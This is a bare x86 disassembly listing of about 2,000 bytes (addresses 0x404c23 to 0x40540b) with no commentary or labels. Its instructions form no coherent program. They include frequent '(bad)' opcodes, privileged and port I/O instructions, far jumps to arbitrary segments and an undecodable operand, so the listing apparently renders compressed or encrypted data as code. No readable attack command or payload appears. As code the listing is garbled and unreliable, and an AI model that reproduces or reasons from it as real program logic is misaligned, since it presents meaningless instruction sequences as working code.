  404c23:	bswap  eax
  404c25:	rcl    BYTE PTR [ecx+0x7f],1
  404c28:	jl     0x404c47
  404c2a:	clc    
  404c2b:	call   0xf8fdc5d2
  404c30:	iret   
  404c31:	adc    al,0x1f
  404c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c34:	jo     0x404c3b
  404c36:	jle    0x404bd4
  404c38:	sti    
  404c39:	(bad)  
  404c3a:	dec    ebp
  404c3b:	(bad)
  404c40:	aad    0xf4
  404c42:	push   ds
  404c43:	jns    0x404c16
  404c45:	(bad)  
  404c46:	sbb    eax,edi
  404c48:	mov    ecx,0x7d0b9ef0
  404c4d:	lock faddp st(7),st
  404c50:	sub    al,0xf8
  404c52:	fisubr WORD PTR [esi+0x404d4871]
  404c58:	pop    es
  404c59:	fdiv   DWORD PTR [ecx-0x7f]
  404c5c:	fild   QWORD PTR [ecx-0x7ee39eff]
  404c62:	popa   
  404c63:	adc    al,0xc4
  404c65:	test   DWORD PTR [edx+0x54],0xe8f10b37
  404c6c:	int    0x37
  404c6e:	xor    BYTE PTR [edx+0x74],al
  404c71:	lahf   
  404c72:	jl     0x404ce1
  404c74:	in     al,dx
  404c75:	sub    edx,DWORD PTR [esi+ecx*4-0x6]
  404c79:	inc    ebx
  404c7a:	leave  
  404c7b:	and    DWORD PTR [ebp-0x3e],ebp
  404c7e:	xor    al,0x90
  404c80:	xor    eax,0x738281b3
  404c85:	jno    0x404cf7
  404c87:	push   esp
  404c88:	stc    
  404c89:	gs mov cl,0x79
  404c8c:	fcomip st,st(2)
  404c8e:	dec    esp
  404c8f:	mov    WORD PTR [esi-0x6c888839],ds
  404c95:	pushf  
  404c96:	iret   
  404c97:	shl    DWORD PTR ds:0x7874a5ea,cl
  404c9d:	mov    DWORD PTR [esi],ebp
  404c9f:	test   DWORD PTR [esi-0x733100e0],ebp
  404ca5:	xchg   ebx,eax
  404ca6:	push   0xe
  404ca8:	call   0x1170:0xaf3fda8a
  404caf:	int    0x89
  404cb1:	arpl   WORD PTR [edx],cx
  404cb3:	adc    ch,ch
  404cb5:	in     al,0xb4
  404cb7:	mov    cl,0x51
  404cb9:	sub    dh,0xf5
  404cbc:	or     ecx,ecx
  404cbe:	jo     0x404d2e
  404cc0:	add    al,0xe5
  404cc2:	ds push cs
  404cc4:	ins    DWORD PTR es:[edi],dx
  404cc5:	pop    esi
  404cc6:	sti    
  404cc7:	imul   esi,DWORD PTR [esp+esi*2+0x42]
  404ccc:	outs   dx,BYTE PTR ds:[esi]
  404ccd:	rcr    BYTE PTR [ebx+0x55],1
  404cd0:	and    BYTE PTR [ebp+0x4bb3309a],ah
  404cd6:	repz into 
  404cd8:	jmp    0x57c2:0x82709b6f
  404cdf:	dec    edx
  404ce0:	test   eax,0x261c4945
  404ce5:	das    
  404ce6:	outs   dx,DWORD PTR ds:[esi]
  404ce7:	addr16 out dx,eax
  404ce9:	mov    ah,0xea
  404ceb:	punpcklbw mm5,DWORD PTR [edi-0x57]
  404cef:	in     eax,0x2
  404cf1:	rol    BYTE PTR [edi+0x2a932603],1
  404cf7:	pop    es
  404cf8:	clc    
  404cf9:	inc    edx
  404cfa:	lock pop ebp
  404cfc:	scas   al,BYTE PTR es:[edi]
  404cfd:	out    dx,al
  404cfe:	inc    edi
  404cff:	dec    esi
  404d00:	pusha  
  404d01:	jb     0x404ccd
  404d03:	sub    ah,BYTE PTR [edx]
  404d05:	xor    BYTE PTR [ebp+0x362f9feb],ch
  404d0b:	pop    eax
  404d0c:	aad    0xcb
  404d0e:	pusha  
  404d0f:	cs jecxz 0x404d88
  404d12:	popf   
  404d13:	inc    ebx
  404d14:	or     al,0xae
  404d16:	fsubr  DWORD PTR [ecx]
  404d18:	mov    esi,0x720fe370
  404d1d:	loop   0x404d08
  404d1f:	rdpmc  
  404d21:	cmp    al,0xb0
  404d23:	cli    
  404d24:	popa   
  404d25:	jb     0x404d5f
  404d27:	xchg   ebx,eax
  404d28:	push   es
  404d29:	mov    ds:0x3cd259a,al
  404d2e:	push   esp
  404d2f:	add    DWORD PTR [ecx-0x7e],eax
  404d32:	pop    esp
  404d33:	sbb    eax,0x52abda58
  404d38:	sti    
  404d39:	fbld   TBYTE PTR [ebp-0x3bcba5f]
  404d3f:	sbb    eax,0x1b972157
  404d44:	push   esp
  404d45:	xchg   esi,eax
  404d46:	mov    cl,0x25
  404d48:	inc    edx
  404d49:	and    DWORD PTR [edi],ecx
  404d4b:	ret    0xe919
  404d4e:	sub    al,0xc
  404d50:	scas   al,BYTE PTR es:[edi]
  404d51:	add    cl,BYTE PTR [ebp-0x6a]
  404d54:	add    esp,DWORD PTR [ecx-0x76b63a35]
  404d5a:	aam    0x33
  404d5c:	lahf   
  404d5d:	imul   edx,DWORD PTR [edx+ebp*4-0x74],0x28
  404d62:	mov    ds:0x8df600e9,al
  404d67:	push   ecx
  404d68:	shl    DWORD PTR [esi],0x57
  404d6b:	push   edx
  404d6c:	mov    ax,0xd301
  404d70:	enter  0xe614,0xba
  404d74:	jae    0x404db6
  404d76:	inc    ecx
  404d77:	and    cl,0xef
  404d7a:	lahf   
  404d7b:	imul   esp,DWORD PTR [ebx],0xbb6e4a25
  404d81:	or     eax,0xa71a7381
  404d86:	(bad)  
  404d87:	(bad)  
  404d88:	(bad)
  404d8b:	mov    edx,0xe1495898
  404d90:	loopne 0x404dc2
  404d92:	js     0x404db5
  404d94:	push   0x25bd6606
  404d99:	mov    bh,bh
  404d9b:	jne    0x404d6b
  404d9d:	sahf   
  404d9e:	test   eax,0x3df183e9
  404da3:	dec    edi
  404da4:	mov    eax,ds:0x441673d9
  404da9:	mov    edx,esp
  404dab:	ja     0x404d32
  404dad:	mov    WORD PTR ds:0xa60fac45,ss
  404db3:	ret    
  404db4:	ds jbe 0x404dd5
  404db7:	xor    BYTE PTR [edx],0x87
  404dba:	xlat   BYTE PTR ds:[ebx]
  404dbb:	sbb    DWORD PTR [eax],0x1877d949
  404dc1:	cmp    eax,0x9c94b6d9
  404dc6:	or     eax,0x985f0d4c
  404dcb:	sub    al,0xb6
  404dcd:	pop    es
  404dce:	sahf   
  404dcf:	push   esi
  404dd0:	(bad)  
  404dd1:	cli    
  404dd2:	xchg   ebp,ecx
  404dd4:	and    esp,DWORD PTR [eax]
  404dd6:	mov    ecx,0x8cbb2f0c
  404ddb:	and    BYTE PTR [eax-0x4b],0x1
  404ddf:	or     DWORD PTR [ecx+eax*1-0x37],ebx
  404de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de4:	adc    eax,0xb6adc48e
  404de9:	pusha  
  404dea:	call   0x2aab6221
  404def:	ss sbb al,0x24
  404df2:	adc    ah,BYTE PTR [esi-0x3ac62229]
  404df8:	xchg   DWORD PTR [edx-0x716c0041],ebp
  404dfe:	imul   esi,DWORD PTR [ecx-0x6e46145a],0xc3ce9256
  404e08:	mov    ds:0x26d27a73,al
  404e0d:	fdiv   QWORD PTR [ecx+0x5c2197a2]
  404e13:	xor    eax,0xfdacae11
  404e18:	push   0xb9a4fc7d
  404e1d:	or     al,cl
  404e1f:	push   cs
  404e20:	xlat   BYTE PTR ds:[ebx]
  404e21:	dec    esi
  404e22:	nop
  404e23:	lock jmp 0xa76c:0x6045fe8c
  404e2b:	dec    ebp
  404e2c:	inc    esp
  404e2d:	outs   dx,DWORD PTR ds:[esi]
  404e2e:	push   es
  404e2f:	dec    edx
  404e30:	or     DWORD PTR [edx+0x72136f36],esi
  404e36:	sub    BYTE PTR [ecx+0x5bc65932],0xf6
  404e3d:	dec    BYTE PTR ds:0x4c66b070
  404e43:	rcl    BYTE PTR [edx+ebx*4+0x1a941873],1
  404e4a:	cmp    eax,0xa55f7ec8
  404e4f:	scas   al,BYTE PTR es:[edi]
  404e50:	ss pushf 
  404e52:	jge    0x404e84
  404e54:	stc    
  404e55:	test   DWORD PTR [edx-0x27bf2378],ebp
  404e5b:	lds    ecx,FWORD PTR [edi+0x73]
  404e5e:	dec    ecx
  404e5f:	adc    DWORD PTR [eax+0x3a690737],esp
  404e65:	mov    ebp,0xfd75124e
  404e6a:	aad    0x2a
  404e6c:	into   
  404e6d:	or     esp,ebx
  404e6f:	pop    ebp
  404e70:	outs   dx,BYTE PTR ds:[esi]
  404e71:	and    dl,BYTE PTR [ecx+esi*8]
  404e74:	mov    al,cs:0xd95b767
  404e7a:	cmp    esp,ecx
  404e7c:	mov    esi,0x2b2137dd
  404e81:	aaa    
  404e82:	cdq    
  404e83:	xchg   BYTE PTR [ebx],bl
  404e85:	fcomp  QWORD PTR [eax-0x1c]
  404e88:	mov    cl,0xff
  404e8a:	in     al,0x10
  404e8c:	pop    edi
  404e8d:	push   ecx
  404e8e:	sub    esp,DWORD PTR [eax-0x67]
  404e91:	les    ecx,FWORD PTR ds:0x2401b06e
  404e97:	push   cs
  404e98:	fnstenv [edi+0x787f61c2]
  404e9e:	push   edi
  404e9f:	sbb    al,0xed
  404ea1:	jo     0x404ed6
  404ea3:	popa   
  404ea4:	xor    eax,0x172ecbff
  404ea9:	mov    ebp,0xd48c3999
  404eae:	sub    eax,0x772ea9a7
  404eb3:	xor    BYTE PTR ds:0xca1ea209,al
  404eb9:	push   0x12b2c9a2
  404ebe:	xchg   edi,eax
  404ebf:	jno    0x404f08
  404ec1:	sbb    al,0x3d
  404ec3:	cmp    DWORD PTR [eax-0x5278fa43],esp
  404ec9:	daa    
  404eca:	dec    ecx
  404ecb:	inc    esi
  404ecc:	sar    BYTE PTR [edx+0x28],0x3c
  404ed0:	mov    ds:0x7942870c,eax
  404ed5:	aaa    
  404ed6:	mov    ds:0xf85f0bc0,al
  404edb:	mov    esp,0x4b1d1334
  404ee0:	push   0xffffff80
  404ee2:	xor    al,0xde
  404ee4:	xchg   edi,eax
  404ee5:	xchg   esi,eax
  404ee6:	mov    ebp,0x67a08e08
  404eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eec:	clc    
  404eed:	lea    ebp,[ecx+0x5]
  404ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ef1:	push   esp
  404ef2:	outs   dx,DWORD PTR ds:[esi]
  404ef3:	ror    DWORD PTR [edi+esi*2-0x36c1f422],cl
  404efa:	mov    dh,0xc3
  404efc:	imul   ebp,DWORD PTR [edi-0x50],0x27
  404f00:	sbb    edx,DWORD PTR [edx+0xc]
  404f03:	fadd   DWORD PTR [ecx]
  404f05:	fidiv  WORD PTR [ebx]
  404f07:	scas   eax,DWORD PTR es:[edi]
  404f08:	rcr    esi,0xe8
  404f0b:	jnp    0x404e92
  404f0d:	fidivr WORD PTR [edi]
  404f0f:	aad    0xeb
  404f11:	iret   
  404f12:	popa   
  404f13:	push   edx
  404f14:	mov    edi,0x29d3470b
  404f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f1a:	repz sbb edi,esp
  404f1d:	lea    edx,[esp+ebp*8]
  404f20:	adc    eax,0x8a521ab2
  404f25:	add    eax,0xe32bed93
  404f2a:	xor    eax,0xab187d7f
  404f2f:	mov    dh,0x8b
  404f31:	push   eax
  404f32:	xchg   ebp,eax
  404f33:	dec    ebp
  404f34:	in     eax,0xec
  404f36:	mov    ecx,0x90c7bfba
  404f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f3c:	mov    ds:0x15c80b40,al
  404f41:	add    al,0xa6
  404f43:	iret   
  404f44:	fsub   DWORD PTR [esi]
  404f46:	out    0x7b,eax
  404f48:	(bad)  
  404f49:	push   edi
  404f4a:	in     al,dx
  404f4b:	mov    cl,0xb2
  404f4d:	dec    edx
  404f4e:	pop    esp
  404f4f:	push   esp
  404f50:	jp     0x404f3c
  404f52:	dec    edx
  404f53:	lods   eax,DWORD PTR ds:[esi]
  404f54:	or     ah,bh
  404f56:	idiv   DWORD PTR [esi]
  404f58:	jno    0x404fd7
  404f5a:	mov    bl,0xa9
  404f5c:	es popa 
  404f5e:	int    0xc3
  404f60:	mov    ebp,0x1f5dfd02
  404f65:	test   eax,0xf2774395
  404f6a:	add    eax,0x8134e8fa
  404f6f:	jmp    0xd25e0bf4
  404f74:	ret    0xdb87
  404f77:	adc    dh,BYTE PTR [ebx]
  404f79:	jae    0x404f95
  404f7b:	ffreep st(2)
  404f7d:	pop    eax
  404f7e:	sub    esi,DWORD PTR [ecx]
  404f80:	stos   BYTE PTR es:[edi],al
  404f81:	ret    
  404f82:	in     eax,dx
  404f83:	pop    ebx
  404f84:	jg     0x404f16
  404f86:	mov    ch,0xb9
  404f88:	xor    eax,0xf572ba05
  404f8d:	loopne 0x404f6d
  404f8f:	daa    
  404f90:	lea    ecx,[eax]
  404f92:	repz push ebx
  404f94:	jb     0x404f84
  404f96:	out    0x66,eax
  404f98:	test   BYTE PTR [ebp+0x3d],ch
  404f9b:	jbe    0x404ffc
  404f9d:	mov    ebx,eax
  404f9f:	fs loope 0x404f2b
  404fa2:	add    ecx,esi
  404fa4:	mov    dl,0x4a
  404fa6:	int3   
  404fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa8:	push   ebx
  404fa9:	dec    edx
  404faa:	xchg   esp,eax
  404fab:	push   ecx
  404fac:	dec    edi
  404fad:	jle    0x404fff
  404faf:	retf   0x8e72
  404fb2:	mov    al,0x3a
  404fb4:	(bad)  
  404fb5:	jnp    0x404fae
  404fb7:	(bad)  
  404fb8:	cli    
  404fb9:	jmp    0x10fc36fb
  404fbe:	mov    cl,0x94
  404fc0:	jnp    0x40501d
  404fc2:	inc    esi
  404fc3:	mov    ebx,0x9941af9a
  404fc8:	sbb    al,0xd1
  404fca:	adc    BYTE PTR [eax+0x19],bh
  404fcd:	add    BYTE PTR [ebx-0x11],dh
  404fd0:	sub    ah,dl
  404fd2:	clc    
  404fd3:	xlat   BYTE PTR ds:[ebx]
  404fd4:	sbb    eax,0x65a329e4
  404fd9:	retf   0xd6fc
  404fdc:	xor    dh,dh
  404fde:	test   eax,0x79c9144d
  404fe3:	jge    0x404ffc
  404fe5:	jl     0x404ff1
  404fe7:	push   esp
  404fe8:	(bad)  
  404fe9:	jge    0x404fdd
  404feb:	add    bh,0xd6
  404fee:	sub    DWORD PTR [eax-0x3ee8d07b],eax
  404ff4:	sub    al,0x44
  404ff6:	in     al,dx
  404ff7:	push   esi
  404ff8:	and    eax,0x6bf0f95a
  404ffd:	lock xchg ebx,eax
  404fff:	dec    eax
  405000:	inc    ecx
  405001:	pop    eax
  405002:	sub    BYTE PTR [ebx+0x3a],dl
  405005:	jmp    0x8e0883dd
  40500a:	cmp    BYTE PTR [esi-0x364ccbec],dl
  405010:	test   DWORD PTR [edi],edi
  405012:	pushf  
  405013:	mov    dl,BYTE PTR [eax+0x56cc60f8]
  405019:	pop    ecx
  40501a:	mov    al,0xb
  40501c:	jmp    0x405008
  40501e:	ins    DWORD PTR es:[edi],dx
  40501f:	cmp    eax,0x8dfdaa0c
  405024:	test   DWORD PTR [edx+0x17808bfa],ecx
  40502a:	(bad)  
  40502b:	fwait
  40502c:	jo     0x405015
  40502e:	sbb    dl,0xbb
  405031:	pop    eax
  405032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405034:	sub    eax,0x4ddf3556
  405039:	sub    BYTE PTR [eax+0xc6b2d7a],ah
  40503f:	and    al,0xd0
  405041:	jo     0x404fff
  405043:	fdivr  DWORD PTR [ebp-0xc4ff7eb]
  405049:	mov    al,ds:0x1edebf3f
  40504e:	test   BYTE PTR [ebx-0x77a0ef60],dl
  405054:	lods   al,BYTE PTR ds:[esi]
  405055:	(bad)  
  405056:	mov    eax,ds:0x5c0f5030
  40505b:	(bad)  
  40505c:	mov    esp,0xc03b360f
  405061:	dec    esi
  405062:	or     BYTE PTR [eax+0x1c],0x47
  405066:	imul   BYTE PTR [edx-0x5ce6ec59]
  40506c:	mov    ebx,0xd2ad0324
  405071:	dec    edx
  405072:	fwait
  405073:	mov    al,fs:0x539bade3
  405079:	jp     0x405034
  40507b:	mov    ss,esi
  40507d:	ds add eax,0x64fe0007
  405083:	rol    BYTE PTR [edx],0x61
  405086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405087:	sar    DWORD PTR [ecx-0x72],cl
  40508a:	retf   
  40508b:	daa    
  40508c:	inc    esp
  40508d:	mov    edi,0x78451b97
  405092:	sbb    eax,0x98e9cbb4
  405097:	or     BYTE PTR [esi+0x3f],dl
  40509a:	dec    ecx
  40509b:	mov    edi,0x2625571b
  4050a0:	xchg   DWORD PTR [edi+0x24],ecx
  4050a3:	xor    BYTE PTR [ebp-0x37],bh
  4050a6:	cmp    al,0xa7
  4050a8:	dec    ecx
  4050a9:	sbb    ah,BYTE PTR [ecx]
  4050ab:	adc    edx,DWORD PTR [ebp-0x10]
  4050ae:	adc    dh,BYTE PTR [esi+0x7e82afb8]
  4050b4:	xchg   ebp,eax
  4050b5:	push   ds
  4050b6:	retf   
  4050b7:	dec    edx
  4050b8:	xchg   esi,eax
  4050b9:	sub    esp,DWORD PTR [eax+0x40]
  4050bc:	mov    edi,0x3b01cd52
  4050c1:	neg    DWORD PTR [edx]
  4050c3:	cmp    esp,esp
  4050c5:	int    0x99
  4050c7:	pop    ds
  4050c8:	and    bh,BYTE PTR [esi+eiz*4-0x34bbef7a]
  4050cf:	js     0x405123
  4050d1:	push   0xa7b97901
  4050d6:	add    ch,BYTE PTR [edx+eiz*2-0x6b19b9b1]
  4050dd:	cmp    al,0xd3
  4050df:	xchg   edx,eax
  4050e0:	jno    0x405145
  4050e2:	push   ds
  4050e3:	inc    edx
  4050e4:	push   esi
  4050e5:	dec    esi
  4050e6:	pop    es
  4050e7:	fisttp WORD PTR [eax-0x5379775a]
  4050ed:	add    DWORD PTR [ebx-0x24],esi
  4050f0:	cmp    BYTE PTR [esp+ebx*8],al
  4050f3:	mov    cl,0xbc
  4050f5:	ds dec edi
  4050f7:	cmp    ebp,esp
  4050f9:	sbb    BYTE PTR [edi-0x4a],ch
  4050fc:	arpl   WORD PTR ds:0xc6af9edf,si
  405102:	test   DWORD PTR [esi+0x1c218dbc],edi
  405108:	mov    ecx,0xa3f79e76
  40510d:	xor    eax,0x8e703c9d
  405112:	ffree  st(5)
  405114:	(bad)  
  405115:	push   cs
  405116:	retf   0xdd0e
  405119:	dec    esp
  40511a:	sbb    ah,0x42
  40511d:	pop    ebp
  40511e:	bound  ebx,QWORD PTR [eax]
  405120:	mov    edx,eax
  405122:	shr    BYTE PTR [esi-0x5914b52e],1
  405128:	imul   DWORD PTR [ebp-0x6e]
  40512b:	cdq    
  40512c:	pop    ebx
  40512d:	mov    al,0x9
  40512f:	aaa    
  405130:	pop    es
  405131:	dec    ecx
  405132:	fdiv   DWORD PTR [ebx]
  405134:	cmp    eax,0xf3442f
  405139:	or     BYTE PTR ds:0x7c679ba2,cl
  40513f:	popf   
  405140:	push   ebp
  405141:	or     BYTE PTR [edx-0x44],0x3f
  405145:	mov    ebp,0x192ae6a3
  40514a:	dec    ecx
  40514b:	dec    edx
  40514c:	push   cs
  40514d:	pop    ss
  40514e:	int    0x9f
  405150:	push   ds
  405151:	push   esi
  405152:	cs in  eax,0xf4
  405155:	lock sub eax,0x2b2874ea
  40515b:	idiv   BYTE PTR [eax+0x6edccc64]
  405161:	xchg   edi,eax
  405162:	lods   eax,DWORD PTR ds:[esi]
  405163:	stos   BYTE PTR es:[edi],al
  405164:	movsx  ebx,BYTE PTR [eax+0x1c073803]
  40516b:	(bad)  
  40516d:	xchg   ebp,eax
  40516e:	jo     0x4051e7
  405170:	xor    dl,BYTE PTR [ebp-0x37]
  405173:	sbb    cl,BYTE PTR [ebx+eax*2+0xa2d4c3f]
  40517a:	cld    
  40517b:	pop    ds
  40517c:	xor    BYTE PTR [eax+esi*1],bh
  40517f:	test   BYTE PTR [ebp+0x2c],dl
  405182:	iret   
  405183:	sub    bl,dl
  405185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405186:	lahf   
  405187:	sbb    BYTE PTR [edi+ebp*1],dh
  40518a:	xchg   edx,eax
  40518b:	xchg   DWORD PTR [eax+0x31],eax
  40518e:	into   
  40518f:	repnz ins BYTE PTR es:[edi],dx
  405191:	test   BYTE PTR [ecx+ecx*2-0x2a1eaecb],dl
  405198:	inc    ebx
  405199:	je     0x4051d0
  40519b:	lock fnstsw WORD PTR [esi+ebp*1+0x65ad9513]
  4051a3:	cld    
  4051a4:	pop    eax
  4051a5:	mov    al,ds:0xf6587c
  4051aa:	add    ebp,DWORD PTR [esi-0x4]
  4051ad:	inc    eax
  4051ae:	pop    eax
  4051af:	sbb    eax,0x35f23875
  4051b4:	mov    esi,0xe0c8df20
  4051b9:	and    DWORD PTR [edx-0x2f4e5609],ebx
  4051bf:	pop    eax
  4051c0:	call   0x95b2:0x8fc448c8
  4051c7:	pop    edi
  4051c8:	cdq    
  4051c9:	mov    bl,0xbf
  4051cb:	jnp    0x405161
  4051cd:	out    0xb3,al
  4051cf:	ins    BYTE PTR es:[edi],dx
  4051d0:	scas   eax,DWORD PTR es:[edi]
  4051d1:	test   ebx,edx
  4051d3:	dec    ecx
  4051d4:	out    0xbb,eax
  4051d6:	data16 mov bh,0x73
  4051d9:	mov    edi,0x777714d2
  4051de:	sub    esp,DWORD PTR [ebx+0x10]
  4051e1:	ins    DWORD PTR es:[edi],dx
  4051e2:	mov    edi,0xa50e5349
  4051e7:	mov    ds:0xb04428b1,eax
  4051ec:	mov    bl,BYTE PTR [eax+0x37]
  4051ef:	inc    ecx
  4051f0:	xchg   esi,eax
  4051f1:	cmp    al,0xf0
  4051f3:	pop    ebp
  4051f4:	stos   BYTE PTR es:[edi],al
  4051f5:	push   es
  4051f6:	retf   
  4051f7:	retf   0x6f6
  4051fa:	xor    ah,BYTE PTR ds:0x1b54c9a4
  405200:	jbe    0x4051bd
  405202:	out    dx,eax
  405203:	inc    ecx
  405204:	leave  
  405205:	adc    al,cl
  405207:	push   ebx
  405208:	sbb    edx,DWORD PTR [edx-0x22]
  40520b:	(bad)  
  40520c:	dec    BYTE PTR [edi]
  40520e:	xchg   edi,eax
  40520f:	add    BYTE PTR [eax-0x1c],0x7b
  405213:	test   BYTE PTR [esi-0x2c],cl
  405216:	or     ah,BYTE PTR [eax]
  405218:	(bad)  
  405219:	femms  
  40521b:	aaa    
  40521c:	pop    ecx
  40521d:	std    
  40521e:	enter  0x82d5,0x87
  405222:	cmp    DWORD PTR [edx+0x323d694e],0xffffff9f
  405229:	pop    ds
  40522a:	test   DWORD PTR [ecx-0xc],edx
  40522d:	repnz xor DWORD PTR [ecx-0x44],0x35
  405232:	sub    cl,BYTE PTR [edi+0x3d]
  405235:	mov    bl,0xc7
  405237:	cmp    BYTE PTR [ebx],dl
  405239:	pop    esi
  40523a:	stos   DWORD PTR es:[edi],eax
  40523b:	adc    al,0x7c
  40523d:	pop    eax
  40523e:	loop   0x405246
  405240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405241:	sub    DWORD PTR [edx-0x7a],0xffffffde
  405245:	in     al,dx
  405246:	jecxz  0x405214
  405248:	aas    
  405249:	xchg   ebx,eax
  40524a:	sub    al,0xe1
  40524c:	repz loop 0x40525b
  40524f:	or     al,0x9f
  405251:	mov    ebx,0xb708212c
  405256:	mov    BYTE PTR [esi],al
  405258:	aas    
  405259:	pushf  
  40525a:	pop    DWORD PTR [ebp-0x6f3931b0]
  405260:	jne    0x4051ff
  405262:	dec    ebx
  405263:	mov    dh,dl
  405265:	or     bl,BYTE PTR [edx-0x7cf85d50]
  40526b:	ins    BYTE PTR es:[edi],dx
  40526c:	inc    edx
  40526d:	push   esi
  40526e:	mov    ds:0x9c5ef09c,eax
  405273:	loopne 0x40522a
  405275:	imul   eax,DWORD PTR [edx+0x75],0xf019549c
  40527c:	inc    edi
  40527d:	sbb    eax,0x7d345594
  405282:	repz hlt 
  405284:	inc    edi
  405285:	shl    BYTE PTR [esi],cl
  405287:	cmp    edi,DWORD PTR [ebp-0x49a7b9c0]
  40528d:	sti    
  40528e:	daa    
  40528f:	jge    0x4052e4
  405291:	adc    eax,0xe529b298
  405296:	ret    
  405297:	push   edx
  405298:	into   
  405299:	jmp    0xc96c:0x5ceb6f
  4052a0:	das    
  4052a1:	dec    esi
  4052a2:	int    0xdc
  4052a4:	in     al,0x33
  4052a6:	add    dh,cl
  4052a8:	sbb    al,0xb3
  4052aa:	mov    cs,WORD PTR [esp+esi*8]
  4052ad:	loope  0x40527d
  4052af:	enter  0x6de9,0xe4
  4052b3:	mov    ecx,0x16561d57
  4052b8:	call   0x88ed:0x763656e1
  4052bf:	pop    ebp
  4052c0:	ins    DWORD PTR es:[edi],dx
  4052c1:	pop    ecx
  4052c2:	imul   edi,DWORD PTR [ecx+0x10],0x43
  4052c6:	push   esi
  4052c7:	mov    WORD PTR [eax-0x4c6da454],fs
  4052cd:	push   es
  4052ce:	repz daa 
  4052d0:	aad    0x1a
  4052d2:	sub    DWORD PTR [edi+0x5d782c1],ebp
  4052d8:	hlt    
  4052d9:	fcom   DWORD PTR fs:[ebx-0x1b]
  4052dd:	cli    
  4052de:	sbb    DWORD PTR [esi+ebx*8],edi
  4052e1:	mov    al,ds:0x99a8458f
  4052e6:	pop    ds
  4052e7:	mov    esp,0xce1a9358
  4052ec:	popa   
  4052ed:	cmp    eax,0x38480e44
  4052f2:	imul   BYTE PTR [esi-0x18]
  4052f5:	div    DWORD PTR [eax+0x30]
  4052f8:	push   ds
  4052f9:	add    BYTE PTR [ebx-0x38452702],al
  4052ff:	(bad)  
  405300:	mov    ebx,0xe90180ec
  405305:	div    BYTE PTR [edi-0x550ce4fc]
  40530b:	mov    al,ds:0x13c8de02
  405310:	shr    bh,cl
  405312:	dec    ebp
  405313:	jno    0x405383
  405315:	pop    ebp
  405316:	std    
  405317:	imul   esi,eax,0xffffffac
  40531a:	mov    bl,0x6c
  40531c:	repnz lods eax,DWORD PTR ds:[esi]
  40531e:	lea    esp,ds:0x73e9aea
  405324:	or     al,0xec
  405326:	push   ebp
  405327:	mov    BYTE PTR [ebx-0x4c2f447e],dh
  40532d:	out    0xf5,eax
  40532f:	inc    ebp
  405330:	repnz pop eax
  405332:	fidivr WORD PTR [edx*2-0x630c5720]
  405339:	add    esp,DWORD PTR [ebp+0x5bb1fa51]
  40533f:	mov    ebx,0x8b23c4bd
  405344:	jmp    0x7973:0x8b4461a4
  40534b:	lock sbb BYTE PTR [ebp-0x29],ch
  40534f:	sub    edi,DWORD PTR [edi]
  405351:	out    0xec,eax
  405353:	mov    eax,0x5f71095f
  405358:	mov    cl,0x1a
  40535a:	aam    0xc1
  40535c:	(bad)  [edi-0x5f]
  40535f:	jg     0x4053b9
  405361:	sub    al,0xd
  405363:	push   ds
  405364:	dec    ebp
  405365:	(bad)  
  405366:	div    BYTE PTR [ecx-0x2f]
  405369:	dec    BYTE PTR [eax+0x68]
  40536c:	inc    ebp
  40536d:	gs into 
  40536f:	xor    BYTE PTR [ecx+0x310103fb],0xa8
  405376:	sti    
  405377:	sbb    BYTE PTR [ebp+0x7a],bh
  40537a:	adc    ebp,ebx
  40537c:	in     eax,0x3c
  40537e:	hlt    
  40537f:	jbe    0x4053d3
  405381:	push   ebp
  405382:	inc    ebx
  405383:	mov    ch,0xee
  405385:	xor    ecx,edi
  405387:	sahf   
  405388:	or     dh,cl
  40538a:	xor    ecx,ebp
  40538c:	add    DWORD PTR [esi+0x731d2152],ebp
  405392:	pop    edx
  405393:	xlat   BYTE PTR ds:[ebx]
  405394:	pusha  
  405395:	push   ss
  405396:	sub    eax,0x9b3dfbc
  40539b:	les    esp,FWORD PTR [edx+0x42]
  40539e:	das    
  40539f:	hlt    
  4053a0:	pop    ebx
  4053a1:	ret    0xe8b0
  4053a4:	scas   eax,DWORD PTR es:[edi]
  4053a5:	push   DWORD PTR [edi-0x3b]
  4053a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a9:	mov    cs,WORD PTR [eax]
  4053ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ac:	test   al,0xf9
  4053ae:	mov    al,ds:0xa9869e65
  4053b3:	jmp    0x405347
  4053b5:	adc    DWORD PTR [ebp+0x6c],ebp
  4053b8:	icebp  
  4053b9:	jnp    0x4053f6
  4053bb:	out    0xec,eax
  4053bd:	imul   edi,esp,0xffffff8a
  4053c0:	mov    ?,WORD PTR [ecx]
  4053c2:	lea    ebp,[edi-0x29]
  4053c5:	out    0x46,eax
  4053c7:	cmp    ch,0xe2
  4053ca:	mov    esp,0x254906fa
  4053cf:	and    ah,BYTE PTR [ecx-0x44]
  4053d2:	hlt    
  4053d3:	retf   0x106a
  4053d6:	inc    eax
  4053d7:	js     0x405416
  4053d9:	aaa    
  4053da:	rcr    BYTE PTR [ebp-0x38],cl
  4053dd:	frstor [edx-0x79]
  4053e0:	mov    eax,ds:0xad2f2409
  4053e5:	add    ah,BYTE PTR [edx-0x6e]
  4053e8:	imul   ecx,DWORD PTR [ecx-0x54755825],0xffffff96
  4053ef:	sti    
  4053f0:	xor    dh,ah
  4053f2:	je     0x4053e3
  4053f4:	neg    DWORD PTR [eax]
  4053f6:	bound  esi,QWORD PTR [esi-0x1f]
  4053f9:	cmp    DWORD PTR [eax-0x4],ebp
  4053fc:	push   ecx
  4053fd:	pusha  
  4053fe:	pop    es
  4053ff:	adc    esp,ebx
  405401:	dec    esi
  405402:	xchg   edi,eax
  405403:	xor    dl,bh
  405405:	call   edi
  405407:	xchg   esp,eax
  405408:	pop    edx
  405409:	test   BYTE PTR [ebx],ch
  40540b:	mov    DWORD PTR [edx+0x31],esi
